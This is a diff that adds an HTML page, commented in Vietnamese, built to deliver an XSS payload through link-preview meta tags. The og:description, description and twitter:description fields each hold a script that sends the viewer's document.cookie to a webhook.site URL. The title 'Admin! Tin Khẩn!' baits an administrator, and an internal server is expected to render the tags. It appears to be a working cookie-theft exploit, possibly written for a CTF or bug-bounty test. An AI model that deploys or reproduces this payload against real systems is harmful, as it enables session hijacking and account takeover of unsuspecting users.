@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Trang Tải XSS Payload</title>
+    <!-- Quan trọng: og:title và og:description chứa XSS payload -->
+    <meta property="og:title" content="Admin! Tin Khẩn!">
+    <meta property="og:description" content="<script>new Image().src='https://webhook.site/#!/view/792a817c-a6b3-4529-a9ed-5780c728488a/?cookie='+encodeURIComponent(document.cookie);</script>">
+    
+    <!-- Bạn có thể thêm các thẻ meta khác nếu muốn, ví dụ name="description" -->
+    <meta name="description" content="<script>new Image().src='https://webhook.site/#!/view/792a817c-a6b3-4529-a9ed-5780c728488a/?cookie='+encodeURIComponent(document.cookie);</script>">
+    
+    <!-- Thử cả twitter cards nữa cho chắc -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Admin! Tin Khẩn!">
+    <meta name="twitter:description" content="<script>new Image().src='https://webhook.site/#!/view/792a817c-a6b3-4529-a9ed-5780c728488a/?cookie='+encodeURIComponent(document.cookie);</script>">
+</head>
+<body>
+    <h1>Nội dung trang này không quan trọng lắm</h1>
+    <p>Internal Server sẽ đọc các thẻ meta ở trên.</p>
+</body>
+</html>
